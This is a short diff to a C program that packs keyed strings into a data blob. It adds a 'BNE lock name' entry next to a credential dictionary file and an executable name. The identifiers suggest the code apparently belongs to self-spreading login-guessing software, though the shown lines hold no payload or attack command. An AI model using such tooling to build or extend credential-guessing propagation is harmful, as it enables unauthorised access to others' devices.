@@ -203,6 +203,7 @@ int main (const int argc, const char **args) {
 	add_file(PRNE_DATA_KEY_CRED_DICT, args[1]);
 	add_cstr(PRNE_DATA_KEY_EXEC_NAME, PRNE_BNE_EXEC_NAME);
 	add_ver_mat();
+	add_cstr(PRNE_DATA_KEY_BNE_LOCK_NAME, PRNE_BNE_LOCK_NAME);
 
 	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);
 
